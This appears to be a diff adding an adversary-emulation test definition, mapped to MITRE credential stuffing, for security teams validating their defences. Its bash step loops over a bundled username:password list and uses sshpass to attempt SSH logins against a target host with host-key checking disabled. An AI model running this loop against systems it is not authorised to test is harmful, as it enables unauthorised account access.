@@ -1,0 +1,34 @@
+api_version: "2.0"
+name: SSH Credential Stuffing From Linux
+description: |
+    Using username,password combination from a password dump to login over SSH.
+args:
+    - name: target_host
+      type: string
+      default: localhost
+uuid: 4f08197a-2a8a-472d-9589-cd2895ef22ad
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1110: Brute Force'
+    subtechniques:
+        - 'T1110.004: Credential Stuffing'
+requirements:
+    platforms:
+        - os: linux
+steps:
+    - name: |
+        Requires SSHPASS
+      inline: |
+        if [ -x "$(command -v sshpass)" ]; then exit 0; else {if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then sudo apt update && sudo apt install sshpass -y; else echo "This test requires sshpass" ; fi ;
+        }; fi;
+      executor: bash
+    - name: ssh-credential-stuffing-from-linux
+      inline: |
+        cp "$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt" /tmp/
+        for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d":" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d":" -f1`@{{.Args.target_host}};done
+      executor: bash
+      cleanup:
+        inline: ""
+        executor: bash
